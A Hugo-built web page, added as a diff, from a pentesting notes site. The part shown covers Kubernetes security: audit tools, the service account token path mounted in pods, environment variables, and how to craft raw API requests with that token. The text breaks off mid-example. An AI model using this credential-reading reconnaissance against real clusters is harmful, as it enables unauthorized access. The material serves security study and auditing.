@@ -1,0 +1,1862 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="All about kubernetes security">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="Kuburnetes" />
+<meta property="og:description" content="All about kubernetes security" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.grayhatfreelancing.com/docs/kuburnetes/" /><meta property="article:section" content="docs" />
+<meta property="article:published_time" content="2022-10-16T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-10-16T00:00:00+00:00" />
+<title>Kuburnetes | Gray Hat Freelancing</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.afc3b3563d1884d85d5f5db04c9a930f7d7c354fdac44481534920d345015a5b.js" integrity="sha256-r8OzVj0YhNhdX12wTJqTD318NU/axESBU0kg00UBWls=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-124168691-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script><!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Gray Hat Freelancing</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+  
+
+
+
+  
+    
+  
+    
+  
+
+
+
+<ul class="book-languages">
+  <li>
+    <input type="checkbox" id="languages" class="toggle" />
+    <label for="languages" class="flex justify-between">
+      <a role="button" class="flex align-center">
+        <img src="/svg/translate.svg" class="book-icon" alt="Languages" />
+        English
+      </a>
+    </label>
+
+    <ul>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/ru/">
+          Russian
+        </a>
+      </li>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/zh/">
+          Chinese
+        </a>
+      </li>
+      
+    </ul>
+  </li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <a href="/docs/example/" class="">Example Site</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/" class="">Table of Contents</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/with-toc/" class="">With ToC</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/without-toc/" class="">Without ToC</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-4e46b01272d410b3a99461d79326ddf4" class="toggle"  />
+    <label for="section-4e46b01272d410b3a99461d79326ddf4" class="flex justify-between">
+      <a role="button" class="">Collapsed</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/" class="">3rd Level</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/4th-level/" class="">4th Level</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/attacking_active_directory/" class="">Active Directory Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/tryhackme_olympus/" class="">Olympus - TryHackMe Walkthrough</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/wordpress/" class="">Wordpress Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_hardening/" class="">Windows - Hardening</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_amsi_bypass/" class="">Bypassing AMSI protections</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/subdomains_enumeration/" class="">Enumerating Subdomains</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_mimikatz/" class="">Windows - Mimikatz</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_persistence/" class="">Windows - Persistence</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_privilege_escalation/" class="">Windows - Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_using_credentials/" class="">Windows - Using Credentials</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_download_and_execute/" class="">Windows Download and Execute Methods</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/escape_breakout/" class="">Application Escape and Breakout</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/office_attacks/" class="">Attacking Office</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/bind_shell_cheatsheet/" class="">Bind Shell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/methodology_and_enumeration/" class="">Bug Hunting Methodology and Enumeration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cobalt_strike_all_you_need/" class="">Cobalt Strike</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/hash_cracking/" class="">Hash Cracking Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/linux_persistence/" class="">Linux - Persistence</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/linux_privilege_escalation/" class="">Linux - Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/metasploit_cheatsheet/" class="">Metasploit</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_dpapi/" class="">Microsoft Window&#39;s Data Protection API</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/microsoft_azure_cloud/" class="">Microsoft&#39;s Azure Cloud</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/network_discovery/" class="">Network Discovery</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/network_pivoting_techniques/" class="">Network Pivoting Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/mssql_server_cheatsheet/" class="">Pentesting MSSQL Server Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/powershell_cheatsheet/" class="">Powershell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/reverse_shell_cheatsheet/" class="">Reverse Shell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/source_code_management/" class="">Source Code Management</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/docker_pentesting/" class="">Docker Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/miscellaneous_tricks/" class="">Miscellaneous Tips and Tricks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/graphql_injection/" class="">GraphQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csv_injection/" class="">Csv Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/checking_for_account_takeover/" class="">Account Takeovers</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/amazon_aws_s3_buckets/" class="">Amazon AWS S3 Buckets</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/api_key_leaks/" class="">API Key Leaks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/command_injection/" class="">Command Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cors_misconfigurations/" class="">CORS Misconfigurations</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/crlf_injection/" class="">CRLF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csrf_injection/" class="">CSRF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cve_exploits/" class="">CVE Exploits</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/dependency_confusion_attacks/" class="">Dependency Confusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/dns_rebinding/" class="">DNS Rebinding</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/file_inclusion/" class="">File Inclusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/http_parameter_pollution/" class="">HTTP Parameter Pollution</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_deserialization/" class="">Insecure Deserialization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_direct_object_references/" class="">Insecure Direct Object References</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_file_uploads/" class="">Insecure File Upload</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_management_interfaces/" class="">Insecure Management Interface</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_source_code_management/" class="">Insecure Source Code Management</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/java_rmi/" class="">Java RMI</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/json_web_token/" class="">JSON Web Tokens</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/kuburnetes/" class="active">Kuburnetes</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/latex_injection/" class="">LaTeX Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ldap_injection/" class="">LDAP Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/nosql_injection/" class="">NoSQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/oauth/" class="">OAuth</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/open_url_redirection/" class="">Open URL Redirection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/race_conditions/" class="">Race Conditions</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/request_smuggling/" class="">Request Smuggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/saml_injection/" class="">SAML Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/server_side_request_forgery/" class="">Server-Side Request Forgery</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/server_side_template_injection/" class="">Server-Side Template Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/sql_injection/" class="">SQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/tabnabbing/" class="">Tabnabbing</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/type_juggling/" class="">Type Juggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/web_cache_deception/" class="">Web Cache Deception</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/web_sockets/" class="">Web Sockets Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xxe_injection/" class="">XML eXternal Entity Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xpath_injection/" class="">XPATH Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xslt_injection/" class="">XSLT Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xss_injection/" class="">XSS Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <span>Shortcodes</span>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/buttons/" class="">Buttons</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/columns/" class="">Columns</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/details/" class="">Details</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/expand/" class="">Expand</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/hints/" class="">Hints</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/katex/" class="">Katex</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/mermaid/" class="">Mermaid</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="toggle"  />
+    <label for="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="flex justify-between">
+      <a href="/docs/shortcodes/section/" class="">Section</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/first-page/" class="">First Page</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/second-page/" class="">Second Page</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/tabs/" class="">Tabs</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/directory_traversal/" class="">Directory Traversal</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/posts/"  >
+        Blog
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/"  target="_blank" rel="noopener">
+        Github
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/grayhatfreelancing"  target="_blank" rel="noopener">
+        Contribute
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Kuburnetes</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#kubernetes">Kubernetes</a>
+      <ul>
+        <li><a href="#tools">Tools</a></li>
+        <li><a href="#container-environment">Container Environment</a>
+          <ul>
+            <li><a href="#service-account">Service Account</a></li>
+            <li><a href="#environment-variables">Environment Variables</a></li>
+            <li><a href="#simulating-kubectl-api-requests">Simulating <code>kubectl</code> API Requests</a></li>
+          </ul>
+        </li>
+        <li><a href="#information-gathering">Information Gathering</a>
+          <ul>
+            <li><a href="#service-account-permissions">Service Account Permissions</a></li>
+            <li><a href="#secrets-configmaps-and-volumes">Secrets, ConfigMaps, and Volumes</a></li>
+            <li><a href="#privileged-containers">Privileged Containers</a></li>
+          </ul>
+        </li>
+        <li><a href="#rbac-configuration">RBAC Configuration</a>
+          <ul>
+            <li><a href="#listing-secrets">Listing Secrets</a></li>
+            <li><a href="#access-any-resource-or-verb">Access Any Resource or Verb</a></li>
+            <li><a href="#pod-creation">Pod Creation</a></li>
+            <li><a href="#privilege-to-use-podsexec">Privilege to Use Pods/Exec</a></li>
+            <li><a href="#privilege-to-getpatch-rolebindings">Privilege to Get/Patch Rolebindings</a></li>
+            <li><a href="#impersonating-a-privileged-account">Impersonating a Privileged Account</a></li>
+          </ul>
+        </li>
+        <li><a href="#privileged-service-account-token">Privileged Service Account Token</a></li>
+        <li><a href="#interesting-endpoints-to-reach">Interesting endpoints to reach</a></li>
+        <li><a href="#api-addresses-that-you-should-know">API addresses that you should know</a>
+          <ul>
+            <li><a href="#cadvisor">cAdvisor</a></li>
+            <li><a href="#insecure-api-server">Insecure API server</a></li>
+            <li><a href="#secure-api-server">Secure API Server</a></li>
+            <li><a href="#etcd-api">etcd API</a></li>
+            <li><a href="#kubelet-api">Kubelet API</a></li>
+            <li><a href="#kubelet-read-only">kubelet (Read only)</a></li>
+          </ul>
+        </li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="kubernetes">
+  Kubernetes
+  <a class="anchor" href="#kubernetes">#</a>
+</h1>
+<blockquote>
+<p>Kubernetes is an open-source container-orchestration system for automating application deployment, scaling, and management. It was originally designed by Google, and is now maintained by the Cloud Native Computing Foundation.</p>
+</blockquote>
+<h2 id="tools">
+  Tools
+  <a class="anchor" href="#tools">#</a>
+</h2>
+<ul>
+<li>
+  <a href="https://github.com/Shopify/kubeaudit">kubeaudit</a> - Audit Kubernetes clusters against common security concerns</li>
+<li>
+  <a href="https://kubesec.io/">kubesec.io</a> - Security risk analysis for Kubernetes resources</li>
+<li>
+  <a href="https://github.com/aquasecurity/kube-bench">kube-bench</a> - Checks whether Kubernetes is deployed securely by running 
+  <a href="https://www.cisecurity.org/benchmark/kubernetes/">CIS Kubernetes Benchmark</a></li>
+<li>
+  <a href="https://github.com/aquasecurity/kube-hunter">kube-hunter</a> - Hunt for security weaknesses in Kubernetes clusters</li>
+<li>
+  <a href="https://katacoda.com/courses/kubernetes">katacoda</a> - Learn Kubernetes using interactive broser-based scenarios</li>
+<li>
+  <a href="https://github.com/armosec/kubescape">kubescape</a> - Automate Kubernetes cluster scans to identify security issues</li>
+</ul>
+<h2 id="container-environment">
+  Container Environment
+  <a class="anchor" href="#container-environment">#</a>
+</h2>
+<p>Containers within a Kubernetes cluster automatically have certain information made available to them through their 
+  <a href="https://kubernetes.io/docs/concepts/containers/container-environment/">container environment</a>. Additional information may have been made available through the volumes, environment variables, or the downward API, but this section covers only what is made available by default.</p>
+<h3 id="service-account">
+  Service Account
+  <a class="anchor" href="#service-account">#</a>
+</h3>
+<p>Each Kubernetes pod is assigned a service account for accessing the Kubernetes API. The service account, in addition to the current namespace and Kubernetes SSL certificate, are made available via a mounted read-only volume:</p>
+<pre tabindex="0"><code>/var/run/secrets/kubernetes.io/serviceaccount/token
+/var/run/secrets/kubernetes.io/serviceaccount/namespace
+/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+</code></pre><p>If the <code>kubectl</code> utility is installed in the container, it will use this service account automatically and will make interacting with the cluster much easier. If not, the contents of the <code>token</code> and <code>namespace</code> files can be used to make HTTP API requests directly.</p>
+<h3 id="environment-variables">
+  Environment Variables
+  <a class="anchor" href="#environment-variables">#</a>
+</h3>
+<p>The <code>KUBERNETES_SERVICE_HOST</code> and <code>KUBERNETES_SERVICE_PORT</code> environment variables are automatically provided to the container. They contain the IP address and port number of the Kubernetes master node.  If <code>kubectl</code> is installed, it will use these values automatically. If not, the values can be used to determine the correct IP address to send API requests to.</p>
+<pre tabindex="0"><code>KUBERNETES_SERVICE_HOST=192.168.154.228
+KUBERNETES_SERVICE_PORT=443
+</code></pre><p>Additionally, 
+  <a href="https://kubernetes.io/docs/concepts/services-networking/service/#discovering-services">environment variables</a> are automatically created for each Kubernetes service running in the current namespace when the container was created.  The environment variables are named using two patterns:</p>
+<ul>
+<li>A simplified <code>{SVCNAME}_SERVICE_HOST</code> and <code>{SVCNAME}_SERVICE_PORT</code> contain the IP address and default port number for the service.</li>
+<li>A 
+  <a href="https://docs.docker.com/network/links/#environment-variables">Docker links</a> collection of variables named <code>{SVCNAME}_PORT_{NUM}_{PROTOCOL}_{PROTO|PORT|ADDR}</code> for each port the service exposes.</li>
+</ul>
+<p>For example, all of the following environment variables would be available if a <code>redis-master</code> service were running with port 6379 exposed:</p>
+<pre tabindex="0"><code>REDIS_MASTER_SERVICE_HOST=10.0.0.11
+REDIS_MASTER_SERVICE_PORT=6379
+REDIS_MASTER_PORT=tcp://10.0.0.11:6379
+REDIS_MASTER_PORT_6379_TCP=tcp://10.0.0.11:6379
+REDIS_MASTER_PORT_6379_TCP_PROTO=tcp
+REDIS_MASTER_PORT_6379_TCP_PORT=6379
+REDIS_MASTER_PORT_6379_TCP_ADDR=10.0.0.11
+</code></pre><h3 id="simulating-kubectl-api-requests">
+  Simulating <code>kubectl</code> API Requests
+  <a class="anchor" href="#simulating-kubectl-api-requests">#</a>
+</h3>
+<p>Most containers within a Kubernetes cluster won&rsquo;t have the <code>kubectl</code> utility installed. If running the 
+  <a href="https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux">one-line <code>kubectl</code> installer</a> within the container isn&rsquo;t an option, you may need to craft Kubernetes HTTP API requests manually. This can be done by using <code>kubectl</code> <em>locally</em> to determine the correct API request to send from the container.</p>
+<ol>
+<li>Run the desired command at the maximum verbosity level using <code>kubectl -v9 ...</code></li>
+<li>The output will include HTTP API endpoint URL, the request body, and an example curl command.</li>
+<li>Replace the endpoint URL&rsquo;s hostname and port with the <code>KUBERNETES_SERVICE_HOST</code> and <code>KUBERNETES_SERVICE_PORT</code> values from the container&rsquo;s environment variables.</li>
+<li>Replace the masked &ldquo;Authorization: Bearer&rdquo; token value with the contents of <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code> from the container.</li>
+<li>If the request had a body, ensure the &ldquo;Content-Type: application/json&rdquo; header is included and send the request body using the customary method (for curl, use the <code>--data</code> flag).</li>
+</ol>
+<p>For example, this output was used to create the 
+  <a href="/#service-account-permissions">Service Account Permissions</a> request:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># NOTE: only the Authorization and Content-Type headers are required. The rest can be omitted.</span>
+</span></span><span style="display:flex;"><span>$ kubectl -v9 auth can-i --list
+</span></span><span style="display:flex;"><span>I1028 <span style="color:#ae81ff">18</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">58</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">38.192352</span>   <span style="color:#ae81ff">76118</span> loader.go<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">359</span>] Config loaded from file /home/example/.kube/config
+</span></span><span style="display:flex;"><span>I1028 <span style="color:#ae81ff">18</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">58</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">38.193847</span>   <span style="color:#ae81ff">76118</span> request.go<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">942</span>] Request Body<span style="color:#960050;background-color:#1e0010">:</span> {<span style="color:#e6db74">&#34;kind&#34;</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;SelfSubjectRulesReview&#34;</span>,<span style="color:#e6db74">&#34;apiVersion&#34;</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;authorization.k8s.io/v1&#34;</span>,<span style="color:#e6db74">&#34;metadata&#34;</span><span style="color:#960050;background-color:#1e0010">:</span>{<span style="color:#e6db74">&#34;creationTimestamp&#34;</span><span style="color:#960050;background-color:#1e0010">:</span>null},<span style="color:#e6db74">&#34;spec&#34;</span><span style="color:#960050;background-color:#1e0010">:</span>{<span style="color:#e6db74">&#34;namespace&#34;</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;default&#34;</span>},<span style="color:#e6db74">&#34;status&#34;</span><span style="color:#960050;background-color:#1e0010">:</span>{<span style="color:#e6db74">&#34;resourceRules&#34;</span><span style="color:#960050;background-color:#1e0010">:</span>null,<span style="color:#e6db74">&#34;nonResourceRules&#34;</span><span style="color:#960050;background-color:#1e0010">:</span>null,<span style="color:#e6db74">&#34;incomplete&#34;</span><span style="color:#960050;background-color:#1e0010">:</span>false}}
+</span></span><span style="display:flex;"><span>I1028 <span style="color:#ae81ff">18</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">58</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">38.193912</span>   <span style="color:#ae81ff">76118</span> round_trippers.go<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">419</span>] curl -k -v -XPOST  -H <span style="color:#e6db74">&#34;Accept: application/json, */*&#34;</span> -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> -H <span style="color:#e6db74">&#34;User-Agent: kubectl/v1.14.10 (linux/amd64) kubernetes/f5757a1&#34;</span> <span style="color:#e6db74">&#39;https://1.2.3.4:5678/apis/authorization.k8s.io/v1/selfsubjectrulesreviews&#39;</span>
